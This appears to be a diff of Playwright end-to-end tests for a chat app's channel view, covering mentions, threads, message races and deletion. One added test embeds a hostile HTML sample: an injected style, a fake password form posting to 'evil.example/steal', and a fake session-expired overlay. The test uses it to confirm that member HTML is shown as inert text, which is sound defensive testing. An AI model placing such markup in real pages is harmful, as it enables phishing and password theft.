@@ -110,7 +110,7 @@ test('shows messages oldest first with authors, mentions, reactions and a thread
 	await expect(items.nth(2)).toContainText('third, by me');
 	// Ann's two messages share one author line.
 	await expect(items.nth(1).getByText('Ann', { exact: true })).toHaveCount(0);
-	await expect(items.nth(1).locator('.mention')).toHaveText('@Test User');
+	await expect(items.nth(1).locator('[data-type="mention"]')).toHaveText('@Test User');
 	await expect(items.nth(1).getByRole('button', { name: 'thumbsup 2' })).toHaveAttribute('aria-pressed', 'true');
 	await expect(items.nth(1).getByRole('button', { name: /2 Replies/ })).toBeVisible();
 	await expect(page.getByText('This is the very beginning of the general channel.')).toBeVisible();
@@ -187,6 +187,76 @@ test('replies to a message and opens a thread that posts into it', async ({ page
 	expect(seen.posted[1]).toMatchObject({ parent_id: 'm1', content: 'in thread' });
 	await expect(thread.getByText('in thread')).toBeVisible();
 	await thread.getByRole('button', { name: 'Close thread' }).click();
+	await expect(page.getByLabel('Thread', { exact: true })).toHaveCount(0);
+});
+
+test("a member's HTML shows as text: no page styles, forms or overlays", async ({ page }) => {
+	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
+	const attack = 'hello <style>body{background:rgb(1, 2, 3) !important}</style><form action="https://evil.example/steal"><input type="password"><button>Sign in</button></form><div style="position:fixed;inset:0">Your session expired</div>';
+	await mockChannels(page, { messages: [message('m1', attack)] });
+	await page.goto('/channels/c1');
+
+	const item = page.getByTestId('channel-message');
+	await expect(item).toContainText('<form action="https://evil.example/steal">');
+	await expect(item.locator('style, form, input, [style*="fixed"]')).toHaveCount(0);
+	expect(await page.evaluate(() => getComputedStyle(document.body).backgroundColor)).not.toBe('rgb(1, 2, 3)');
+});
+
+test('a message that arrives while the channel is still loading is not lost', async ({ page }) => {
+	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
+	const socket = await fakeSocketServer(page);
+	await mockChannels(page, { messages: [message('m1', 'hello')] });
+	let release!: () => void;
+	const gate = new Promise<void>((resolve) => (release = resolve));
+	let asked = false;
+	await page.route(/\/api\/v1\/channels\/c1\/messages\?/, async (route) => {
+		asked = true;
+		await gate;
+		return json(route, [message('m1', 'hello')]);
+	});
+	await page.goto('/channels/c1');
+	await socket.connected;
+	await expect.poll(() => asked && socket.emitted('events:channel').some((d) => d.channel_id === 'c1' && d.data.type === 'last_read_at')).toBe(true);
+	socket.emit('events:channel', { channel_id: 'c1', message_id: null, user: ann, data: { type: 'message', data: message('m2', 'sent while loading') } });
+	release();
+	await expect(page.getByTestId('channel-message')).toHaveCount(2);
+	await expect(page.getByText('sent while loading')).toBeVisible();
+});
+
+test('a sent message keeps its author and quote when the response beats the echo', async ({ page }) => {
+	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
+	await mockChannels(page, { messages: [message('m1', 'hello from Ann')] });
+	// The real endpoint answers with the bare message: no user, quote or reactions.
+	await page.route('**/api/v1/channels/c1/messages/post', (route) => {
+		const body = route.request().postDataJSON();
+		return json(route, { id: 'm200', channel_id: 'c1', parent_id: null, user_id: me.id, content: body.content, reply_to_id: body.reply_to_id, data: null, meta: null, created_at: ns(), updated_at: ns() });
+	});
+	await page.goto('/channels/c1');
+	const first = page.getByTestId('channel-message').first();
+	await first.hover();
+	await first.getByRole('button', { name: 'Reply', exact: true }).click();
+	await page.getByRole('textbox', { name: 'Message' }).fill('my answer');
+	await page.keyboard.press('Enter');
+	const sent = page.getByTestId('channel-message').filter({ hasText: 'my answer' });
+	await expect(sent).toHaveAttribute('id', /m200/);
+	await expect(sent).toContainText('Test User');
+	await expect(sent).toContainText('hello from Ann');
+	await expect(page.getByText('Unknown User')).toHaveCount(0);
+});
+
+test('deleting the root from inside its thread closes the thread', async ({ page }) => {
+	await mockWorkspaceBackend(page, { role: 'user', ...enabled });
+	const mine = { user_id: me.id, user: me };
+	// The thread endpoint lists the root with its replies.
+	await mockChannels(page, { messages: [message('m1', 'my root', { ...mine, reply_count: 1, latest_reply_at: ns(1) })], thread: [message('t1', 'a reply', { parent_id: 'm1' }), message('m1', 'my root', mine)] });
+	await page.setViewportSize({ width: 1280, height: 800 });
+	await page.goto('/channels/c1');
+	await page.getByTestId('channel-message').first().getByRole('button', { name: /1 Reply/ }).click();
+	const thread = page.getByLabel('Thread', { exact: true });
+	const root = thread.getByTestId('channel-message').filter({ hasText: 'my root' });
+	await root.hover();
+	await root.getByRole('button', { name: 'Delete' }).click();
+	await page.getByRole('alertdialog').getByRole('button', { name: 'Delete' }).click();
 	await expect(page.getByLabel('Thread', { exact: true })).toHaveCount(0);
 });
 
